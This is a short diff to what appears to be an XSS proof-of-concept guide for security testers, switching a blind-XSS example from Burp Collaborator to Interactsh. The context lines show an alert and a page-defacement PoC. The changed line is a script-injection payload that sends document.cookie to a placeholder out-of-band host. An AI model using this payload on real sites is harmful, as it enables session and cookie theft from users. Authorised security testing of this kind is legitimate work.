@@ -227,10 +227,10 @@ alert("XSS - Domain: "+document.domain+"\nCookies would be: "+document.cookie.le
 document.body.innerHTML='<h1>XSS PoC by YourHandle</h1><p>This page was modified via XSS.</p>';
 ```
 
-### Burp Collaborator for Blind XSS
+### Interactsh for Blind XSS
 
 ```javascript
-"><script>fetch("https://YOUR-ID.burpcollaborator.net/?c="+document.cookie)</script>
+"><script>fetch("https://YOUR-ID.oast.fun/?c="+document.cookie)</script>
 ```
 
 Shows:
